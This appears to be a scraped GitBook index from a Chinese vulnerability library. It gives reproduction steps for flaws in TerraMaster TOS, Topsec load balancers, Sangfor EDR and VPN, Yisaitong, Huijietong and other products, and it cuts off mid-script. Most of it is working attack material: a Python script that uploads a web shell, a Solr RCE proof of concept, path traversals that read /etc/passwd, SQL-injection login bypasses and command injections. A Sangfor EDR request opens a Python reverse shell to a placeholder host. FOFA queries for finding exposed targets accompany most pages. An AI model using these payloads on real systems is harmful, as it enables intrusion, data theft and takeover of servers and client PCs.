reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/TerraMaster/TerraMaster TOS 任意账号密码修改漏洞 CVE-2020-28186.html":{"url":"book/Web应用漏洞/TerraMaster/TerraMaster TOS 任意账号密码修改漏洞 CVE-2020-28186.html","title":"TerraMaster TOS 任意账号密码修改漏洞 CVE-2020-28186","keywords":"","body":"TerraMaster TOS 任意账号密码修改漏洞 CVE-2020-28186 漏洞描述 TerraMaster TOS 漏洞影响 [!NOTE] TerraMaster TOS FOFA [!NOTE] \"TerraMaster\" && header=\"TOS\" 漏洞复现 首先需要知道已知用户名，可以参考 TerraMaster TOS 用户枚举漏洞 CVE-2020-28185 获取已知的用户名 重置页面输入获取的账号和邮箱 点击确定，抓包更换邮箱接收验证码 通过接收的验证码即可更换账号密码登录后台 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/TerraMaster/TerraMaster TOS 后台任意文件读取漏洞 CVE-2020-28187.html":{"url":"book/Web应用漏洞/TerraMaster/TerraMaster TOS 后台任意文件读取漏洞 CVE-2020-28187.html","title":"TerraMaster TOS 后台任意文件读取漏洞 CVE-2020-28187","keywords":"","body":"TerraMaster TOS 后台任意文件读取漏洞 CVE-2020-28187 漏洞描述 TerraMaster TOS 漏洞影响 [!NOTE] TerraMaster TOS FOFA [!NOTE] \"TerraMaster\" && header=\"TOS\" 漏洞复现 登陆后访问，验证漏洞的POC为 /tos/index.php?editor/fileGet&filename=../../../../../../etc/passwd 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/TerraMaster/TerraMaster TOS RCE CVE-2020-28188.html":{"url":"book/Web应用漏洞/TerraMaster/TerraMaster TOS RCE CVE-2020-28188.html","title":"TerraMaster TOS RCE CVE-2020-28188","keywords":"","body":"TerraMaster TOS RCE CVE-2020-28188 漏洞描述 TerraMaster TOS 4.2.06 以下中 makecvs.php 存在任意文件写入，攻击者可以上传恶意文件控制服务器 漏洞影响 [!NOTE] TerraMaster TOS FOFA [!NOTE] \"TerraMaster\" && header=\"TOS\" 漏洞复现 登录页面如下 存在漏洞的为 /include/makecvs.php 中的Event参数 使用EXP文件上传并执行命令 漏洞POC # Exploit Title: TerraMaster TOS 4.2.06 - RCE (Unauthenticated) # Date: 12/12/2020 # Exploit Author: IHTeam # Full Write-up: https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/ # Vendor Homepage: https://www.terra-master.com/ # Version: \\\" >> /usr/www/\"+shell_filename+\" && chmod +x /usr/www/\"+shell_filename+\"||\" payload = urllib.parse.quote(payload, safe='') print(\"[/] Uploading shell...\") response = requests.get(url+'/include/makecvs.php?Event='+payload, headers=headers, verify=False) time.sleep(1) response = requests.get(url+'/'+shell_filename+'?cmd=cat /etc/passwd', headers=headers, verify=False) if ('root:' in str(response.content, 'utf-8')): print(\"[+] Upload succeeded\") else: print(\"\\n[-] Error uploading shell: \", response.content) sys.exit() def interactive_shell(url, headers, shell_filename, cmd): response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(cmd, safe=''), headers=headers, verify=False) print(str(response.text)+\"\\n\") def delete_shell(url, headers, shell_filename): delcmd = \"rm /usr/www/\"+shell_filename response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(delcmd, safe=''), headers=headers, verify=False) print(\"\\n[+] Shell deleted\") upload_shell(url, headers, shell_filename) try: while True: cmd = input(\"# \") interactive_shell(url, headers, shell_filename, cmd) except: delete_shell(url, headers, shell_filename) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/1039家校通/":{"url":"book/Web应用漏洞/1039家校通/","title":"1039家校通","keywords":"","body":"1039家校通 1039家校通 万能密码绕过 CNVD-2020-31494 1039家校通 后台任意文件上传漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/1039家校通/1039家校通 万能密码绕过 CNVD-2020-31494.html":{"url":"book/Web应用漏洞/1039家校通/1039家校通 万能密码绕过 CNVD-2020-31494.html","title":"1039家校通 万能密码绕过 CNVD-2020-31494","keywords":"","body":"1039家校通 万能密码绕过 CNVD-2020-31494 漏洞描述 北京1039科技发展有限公司是一家专注驾校管理系统、驾校移动办公系统、驾校管理软件、驾校招生小程序开发等,为驾校提供无死角的驾校管理系统解决方案。 北京1039科技发展有限公司驾校管理系统存在万能密码绕过漏洞，攻击者可利用该漏洞获取数据库信息。 漏洞影响 [!NOTE] 1039家校通 v1.0 - v6.0 FOFA [!NOTE] title=\"学员登录_1039家校通\" 漏洞复现 管理员登录接口为 /admin/Product/Comstye.aspx /Student/StudentLogin.aspx /Teacher/Index.aspx 账号密码为如下即可登录 user:peiqi pass:' or ''=' 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/1039家校通/1039家校通 后台任意文件上传漏洞.html":{"url":"book/Web应用漏洞/1039家校通/1039家校通 后台任意文件上传漏洞.html","title":"1039家校通 后台任意文件上传漏洞","keywords":"","body":"1039家校通 后台任意文件上传漏洞 漏洞描述 北京1039科技发展有限公司是一家专注驾校管理系统、驾校移动办公系统、驾校管理软件、驾校招生小程序开发等,为驾校提供无死角的驾校管理系统解决方案。 北京1039科技发展有限公司驾校管理系统后台编辑器存在任意文件上传漏洞，攻击者可以通过抓包的方式得知webshell路径，导致服务器被入侵 漏洞影响 [!NOTE] 1039家校通 v1.0 - v6.0 FOFA [!NOTE] title=\"学员登录_1039家校通\" 漏洞复现 使用 1039家校通 万能密码绕过 CNVD-2020-31494 登录后台后找到编辑器页面 Burp抓包上传 asp webshell木马 可以得知webshell地址，这里我使用的冰蝎默认马，使用冰蝎连接 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/汉王科技/":{"url":"book/Web应用漏洞/汉王科技/","title":"汉王科技","keywords":"","body":"汉王科技 汉王人脸考勤管理系统 Check SQL注入漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/汉王科技/汉王人脸考勤管理系统 Check SQL注入漏洞.html":{"url":"book/Web应用漏洞/汉王科技/汉王人脸考勤管理系统 Check SQL注入漏洞.html","title":"汉王人脸考勤管理系统 Check SQL注入漏洞","keywords":"","body":"汉王人脸考勤管理系统 Check SQL注入漏洞 漏洞描述 汉王人脸考勤管理系统存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。 漏洞影响 [!NOTE] 汉王人脸考勤管理系统 FOFA [!NOTE] title=\"\"汉王人脸考勤管理系统\"\" 漏洞复现 登录界面如下 请求包如下 POST /Login/Check HTTP/1.1 Host: x.x.x.x Content-Length: 27 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://x.x.x.x:8088 Referer: http://x.x.x.x:8088/Login/Index Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: ASP.NET_SessionId=otvxgfy0csmrw4i5y5t24oo1 Connection: close strName=admin&strPwd=123456 其中strName参数存在注入 sqlmap -r postwang.txt -p strName --current-user user: admin' or 1=1-- pass: admin 万能密码绕过登录 Goby & POC 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/极通EWEBS/":{"url":"book/Web应用漏洞/极通EWEBS/","title":"极通EWEBS","keywords":"","body":"极通EWEBS 极通EWEBS testweb.php 敏感信息泄露漏洞 极通EWEBS casmain.xgi 任意文件读取漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/极通EWEBS/极通EWEBS casmain.xgi 任意文件读取漏洞.html":{"url":"book/Web应用漏洞/极通EWEBS/极通EWEBS casmain.xgi 任意文件读取漏洞.html","title":"极通EWEBS casmain.xgi 任意文件读取漏洞","keywords":"","body":"极通EWEBS casmain.xgi 任意文件读取漏洞 漏洞描述 极通EWEBS casmain.xgi 任意文件读取漏洞，攻击者通过漏洞可以读取任意文件 漏洞影响 [!NOTE] 极通EWEBS FOFA [!NOTE] app=\"新软科技-极通EWEBS\" 漏洞复现 登录页面如下 漏洞请求包为 POST /casmain.xgi HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=923b86fa90ce1e14c82d4e36d1adc528; CookieLanguageName=ZH-CN Content-Length: 57 Language_S=../../../../windows/system32/drivers/etc/hosts 可以配合 testweb.php 信息泄露读取敏感信息 Language_S=../../Data/CONFIG/CasDbCnn.dat 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/极通EWEBS/极通EWEBS testweb.php 敏感信息泄露漏洞.m.html":{"url":"book/Web应用漏洞/极通EWEBS/极通EWEBS testweb.php 敏感信息泄露漏洞.m.html","title":"极通EWEBS testweb.php 敏感信息泄露漏洞.m","keywords":"","body":"极通EWEBS testweb.php 敏感信息泄露漏洞.m 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:50:07 "},"book/Web应用漏洞/亿赛通/":{"url":"book/Web应用漏洞/亿赛通/","title":"亿赛通","keywords":"","body":"亿赛通 亿赛通 电子文档安全管理系统 dataimport 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/亿赛通/亿赛通 电子文档安全管理系统 dataimport 远程命令执行漏洞.html":{"url":"book/Web应用漏洞/亿赛通/亿赛通 电子文档安全管理系统 dataimport 远程命令执行漏洞.html","title":"亿赛通 电子文档安全管理系统 dataimport 远程命令执行漏洞","keywords":"","body":"亿赛通 电子文档安全管理系统 dataimport 远程命令执行漏洞 漏洞描述 亿赛通 电子文档安全管理系统 dataimport 存在远程命令执行漏洞，攻击者通过构造特定的请求可执行任意命令 漏洞影响 [!NOTE] 亿赛通 电子文档安全管理系统 FOFA [!NOTE] title=\"电子文档安全管理系统\" 漏洞复现 登录页面如下 先获取 core name 访问路径 /solr/admin/cores 使用POC执行whoami 漏洞POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : 亿赛通 电子文档安全管理系统 dataimport 远程命令执行漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/solr/admin/cores\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/solr/admin/cores.... \\033[0m\".format(target_url)) if 'responseHeader' in response.text and response.status_code == 200: result = re.search( r'([\\s\\S]*?)', response.text, re.I) core_name = result.group(1) print(\"\\033[36m[o] 获取core_name : {} \\033[0m\".format(core_name)) POC_2(target_url, core_name) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, core_name): cmd = \"whoami\" vuln_url = target_url + \"/solr/{}/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22{}%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20\".format(core_name, cmd) files = { 'stream.body': ''' ''' } try: print(\"\\033[36m[o] 正在执行 whoami ... \\033[0m\".format(target_url)) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, files=files, verify=False, timeout=5) cmd_response = re.search( r'documents\">([\\s\\S]*?)', response.text, re.I) cmd_response = cmd_response.group(1) if response.status_code == 200 and cmd_response: print(\"\\033[36m[o] 命令响应为:\\n{} \\033[0m\".format(cmd_response)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/中创视迅/":{"url":"book/Web应用漏洞/中创视迅/","title":"中创视迅","keywords":"","body":"中创视迅 会捷通云视讯 list 目录文件泄露漏洞 会捷通云视讯 fileDownload 任意文件读取漏洞 会捷通云视讯 登录绕过漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/中创视迅/会捷通云视讯 list 目录文件泄露漏洞.html":{"url":"book/Web应用漏洞/中创视迅/会捷通云视讯 list 目录文件泄露漏洞.html","title":"会捷通云视讯 list 目录文件泄露漏洞","keywords":"","body":"会捷通云视讯 list 目录文件泄露漏洞 漏洞描述 会捷通云视讯某个文件 list参数 存在目录文件泄露漏洞，攻击者通过漏洞可以获取一些敏感信息 漏洞影响 [!NOTE] 会捷通云视讯 FOFA [!NOTE] body=\"/him/api/rest/v1.0/node/role\" 漏洞复现 登陆页面如下 访问Url /him/api/rest/V1.0/system/log/list?filePath=../ Goby & POC 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/中创视迅/会捷通云视讯 fileDownload 任意文件读取漏洞.html":{"url":"book/Web应用漏洞/中创视迅/会捷通云视讯 fileDownload 任意文件读取漏洞.html","title":"会捷通云视讯 fileDownload 任意文件读取漏洞","keywords":"","body":"会捷通云视讯 fileDownload 任意文件读取漏洞 漏洞描述 会捷通云视讯 fileDownload 存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器上的任意文件 漏洞影响 [!NOTE] 会捷通云视讯 FOFA [!NOTE] body=\"/him/api/rest/v1.0/node/role\" 漏洞复现 登陆页面如下 发送请求包 POST /fileDownload?action=downloadBackupFile HTTP/1.1 Host: Content-Length: 24 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://36.99.45.142:9090/fileDownload?action=downloadBackupFile Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 fullPath=%2Fetc%2Fpasswd Goby & POC 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/中创视迅/会捷通云视讯 登录绕过漏洞.html":{"url":"book/Web应用漏洞/中创视迅/会捷通云视讯 登录绕过漏洞.html","title":"会捷通云视讯 登录绕过漏洞","keywords":"","body":"会捷通云视讯 登录绕过漏洞 漏洞描述 会捷通云视讯存在登陆绕过漏洞，通过拦截特定的请求包并修改即可获取后台权限 漏洞影响 [!NOTE] 会捷通云视讯 FOFA [!NOTE] body=\"/him/api/rest/v1.0/node/role\" 漏洞复现 登陆页面如下 输入任意账号密码抓包 修改返回包为如下后放包则成功绕过登录 HTTP/1.1 200 Server: Hsengine/1.4.1 Date: Mon, 17 May 2021 16:13:43 GMT Content-Type: application/json;charset=UTF-8 Connection: close X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-XSS-Protection: 1; mode=block Accept-Ranges: bytes Vary: Accept-Charset, Accept-Encoding, Accept-Language, Accept Content-Length: 61 {\"token\":null,\"result\":null} 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/天融信/":{"url":"book/Web应用漏洞/天融信/","title":"天融信","keywords":"","body":"天融信 天融信负载均衡TopApp-LB 任意登陆 天融信负载均衡TopApp-LB 命令执行漏洞 天融信负载均衡TopApp-LB Sql注入漏洞 天融信负载均衡TopApp-LB enable_tool_debug.php 远程命令执行漏洞 天融信LDP未授权访问漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/天融信/天融信负载均衡TopApp-LB任意登陆.html":{"url":"book/Web应用漏洞/天融信/天融信负载均衡TopApp-LB任意登陆.html","title":"天融信负载均衡TopApp-LB任意登陆","keywords":"","body":"天融信负载均衡TopApp-LB任意登陆 漏洞描述 天融信负载均衡TopApp-LB系统无需密码可直接登陆，查看敏感信息 影响版本 天融信负载均衡TopApp-LB FOFA [!NOTE] app=\"天融信-TopApp-LB-负载均衡系统\" 漏洞复现 在登录页面中输入，账号:任意账号 密码:;id 成功登录 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/天融信/天融信负载均衡TopApp-LB enable_tool_debug.php 远程命令执行漏洞.html":{"url":"book/Web应用漏洞/天融信/天融信负载均衡TopApp-LB enable_tool_debug.php 远程命令执行漏洞.html","title":"天融信负载均衡TopApp-LB enable_tool_debug.php 远程命令执行漏洞","keywords":"","body":"天融信负载均衡TopApp-LB enable_tool_debug.php 远程命令执行漏洞 漏洞描述 天融信 TopSec-LB enable_tool_debug.php文件存在 远程命令执行漏洞，通过命令拼接攻击者可以执行任意命令 漏洞影响 [!NOTE] 天融信 TopSec-LB FOFA [!NOTE] app=\"天融信-TopApp-LB-负载均衡系统\" 漏洞复现 登录页面如下 漏洞文件为 enable_tool_debug.php commandWrapper.inc 文件中的 runTool function runTool($val,$tool,$par){ if($val==\"0\"){ UciUtil::setValue('system', 'runtool', 'tool', $tool); UciUtil::setValue('system', 'runtool', 'parameter', $par); UciUtil::commit('system'); if($tool==\"1\"){ exec('ping '.$par.'>/tmp/tool_result &'); }else if($tool==\"2\"){ exec('traceroute '.$par.'>/tmp/tool_result &'); } }else if($val==\"1\"){ $tool=UciUtil::getValue('system', 'runtool', 'tool'); if($tool==\"1\"){ exec('killall ping '); }else if($tool==\"2\"){ exec('killall traceroute '); } UciUtil::setValue('system', 'runtool', 'tool', ''); UciUtil::setValue('system', 'runtool', 'parameter', ''); UciUtil::commit('system'); exec('echo \"\">/tmp/tool_result'); } } 这里设置 var=0，tool=1，再进行命令拼接造成远程命令执行 /acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1' | cat /etc/passwd > ../../test.txt |' 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/天融信/天融信负载均衡TopApp-LB命令执行漏洞.html":{"url":"book/Web应用漏洞/天融信/天融信负载均衡TopApp-LB命令执行漏洞.html","title":"天融信负载均衡TopApp-LB命令执行漏洞","keywords":"","body":"天融信负载均衡TopApp-LB命令执行漏洞 漏洞描述 天融信负载均衡TopApp-LB系统存在任意命令执行 影响版本 天融信负载均衡TopApp-LB FOFA [!NOTE] app=\"天融信-TopApp-LB-负载均衡系统\" 漏洞复现 登录界面中存在命令执行 账号:1;ping 6km5dk.ceye.io;echo 密码:任意 成功收到请求 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/天融信/天融信负载均衡TopApp-LB Sql注入漏洞.html":{"url":"book/Web应用漏洞/天融信/天融信负载均衡TopApp-LB Sql注入漏洞.html","title":"天融信负载均衡TopApp-LB Sql注入漏洞","keywords":"","body":"天融信负载均衡TopApp-LB Sql注入漏洞 漏洞描述 天融信负载均衡 TopAPP-LB产品旧版本在管理面存在SQL注入漏洞，具体为在可以访问管理服务情况 下，攻击者通过构造恶意请求，利用系统检查输入条件不严格的缺陷，进一步可获取部分系统本地信息 影响版本 天融信负载均衡TopApp-LB FOFA [!NOTE] app=\"天融信-TopApp-LB-负载均衡系统\" 漏洞复现 利用 天融信负载均衡TopApp-LB 任意登陆 使用后台 提交以下数据包 POST /acc/clsf/report/datasource.php HTTP/1.1 Host: Connection: close Accept: text/javascript, text/html, application/xml, text/xml, */* X-Prototype-Version: 1.6.0.3 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57 Content-Type: application/x-www-form-urlencoded Content-Length: 201 t=l&e=0&s=t&l=1&vid=2147483647 or 1=1&gid=0&lmt=10&o=r_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@。。 存在SQL盲注 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/天融信/天融信LDP未授权访问漏洞.html":{"url":"book/Web应用漏洞/天融信/天融信LDP未授权访问漏洞.html","title":"天融信LDP未授权访问漏洞","keywords":"","body":"天融信LDP未授权访问漏洞 漏洞描述 天融信LDP存在未授权访问漏洞 漏洞影响 [!NOTE] 天融信LDP 漏洞复现 POC为 默认用户superman的uid=1 POST /?module-auth_user&action=mod_edit.pwd HTTP/1.1 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/深信服/":{"url":"book/Web应用漏洞/深信服/","title":"深信服","keywords":"","body":"深信服 深信服EDR远程命令执行 CNVD-2020-46552 深信服后台任意用户登陆漏洞 深信服 SSL VPN 客户端远程文件下载 深信服 行为感知系统 c.php 远程命令执行漏洞 深信服 日志中心 c.php 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/深信服/深信服EDR远程命令执行 CNVD-2020-46552.html":{"url":"book/Web应用漏洞/深信服/深信服EDR远程命令执行 CNVD-2020-46552.html","title":"深信服EDR远程命令执行 CNVD-2020-46552","keywords":"","body":"深信服EDR远程命令执行 CNVD-2020-46552 漏洞描述 深信服终端检测响应平台是深信服公司开发的一套EDR系统。攻击者利用该漏洞，可向目标服务器发送恶意构造的HTTP请求，从而获得目标服务器的权限，实现远程代码控制执行。 影响版本 [!NOTE] EDR v3.2.16 EDR v3.2.17 EDR v3.2.19 漏洞复现 https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&limit=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&host=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&path=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&row=whoami 反弹shell POST /tool/log/c.php HTTP/1.1 Host: x.x.x.x Upgrade-Insecure-Requests: 1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Content-Type: application/x-www-form-urlencoded;charset=utf-8 Accept-Language: zh-CN,zh;q=0.9 Content-Length: 256 strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xxx.xxx.xxx.xxx\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 向 /tool/log/c.php POST以下数据即可 strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xxx.xxx.xxx.xxx\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/深信服/深信服 SSL VPN 客户端远程文件下载.html":{"url":"book/Web应用漏洞/深信服/深信服 SSL VPN 客户端远程文件下载.html","title":"深信服 SSL VPN 客户端远程文件下载","keywords":"","body":"深信服 SSL VPN 客户端远程文件下载 漏洞描述 深信服 SSL VPN 客户端存在远程文件下载，且文件可控下载后可执行 漏洞影响 [!NOTE] 深信服 SSL VPN 漏洞复现 百度\"intitle: 欢迎使用SSL VPN\"，随便找一个地方下载VPN客户端下载安装： 安装完之后访问VPN的页面，发现VPN会自动下载组件更新： 这些请求均为GET请求并附带着一些参数，我们把它一一列下来： 本地来看一下这个54530端口对应的进程是什么： 发现这个端口是ECAgent.exe开启的，寻找到对应进程文件所在位置： 确认这是XXX SSLVPN的程序，那么就可以将两者联系到一起，访问VPN登录首页会触发对127.0.0.1的访问从而引起VPN进行组件更新。 通过以上的分析我们猜测了整个大致流程，但我们设想一下如果我们可以控制本地的更新指向我们的服务器，然后将更新的组件内容替换成恶意程序，当程序启动的时候就启动了恶意程序，这样我们可以拿到安装VPN客户端的使用者PC权限。 再回到之前的本地链接列表，根据对英文的理解，参数op的值应该为其具体对应要执行的动作： InitECAgent -> 初始化 GetEncryptKey -> 获取加密密钥 DoConfigure -> 配置 CheckReLogin -> 检查重新登录 CheckProxySetting -> 检查代理设置 UpdateControls -> 更新控制 DoQueryService -> 查询服务 第一个初始化的请求存在可控参数arg1： https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=vpn.xxx.edu.cn%20443&callback=EA_cb10000 参数arg1=vpn.xxx.edu.cn%20443，对应值也就是HOST+空格+端口的格式，看到这里基本上就会有一个思路，客户端更新控件是不是根据这个指定值向其发送请求更新的呢？我们可以只替换第一个初始化请求的arg1参数为172.20.10.2 8000，然后本地搭建一个HTTP服务： python -m SimpleHTTPServer 其他的请求原封不动，依次请求一遍那一份URL 服务端成功收到请求，但是却出现了错误的提示： 首先我们已经验证了自己的猜想，更新地址是自己可控的，客户端确实会向我们指定的服务端发送请求，但由于出现了错误我们不知道客户端访问了哪个文件，也不知道访问文件之后做了什么动作。 现在要做的就是搭建一个客户端可以正常访问的请求，通过这个错误大致可以知道，我搭建的服务端协议和客户端请求使用的协议不一致，本机抓个包发现客户端请求的是 HTTPS 协议，这就需要搭建一个 HTTPS 服务了。 如下脚本基于Python库建立一个 HTTPS 服务： # openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes import BaseHTTPServer, SimpleHTTPServer import ssl httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 8000), SimpleHTTPServer.SimpleHTTPRequestHandler) httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True) httpd.serve_forever() 搭建起一个 HTTPS 环境后再次复现如上请求，服务端收到日志： 可以看见客户端会访问两个文件： /com/WindowsModule.xml /com/win/XXXUD.exe 先不管xml文件是怎么样的，可执行文件(exe)是需要重视的，但是这里通过提示可以看出客户端发出的请求是POST请求，但我们所写的Python脚本建立的HTTPS服务并不支持POST方法，我们需要重写一下Handler： import BaseHTTPServer import SimpleHTTPServer import cgi import ssl class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler): def do_POST(self): form = cgi.FieldStorage() SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self) Handler = ServerHandler httpd = 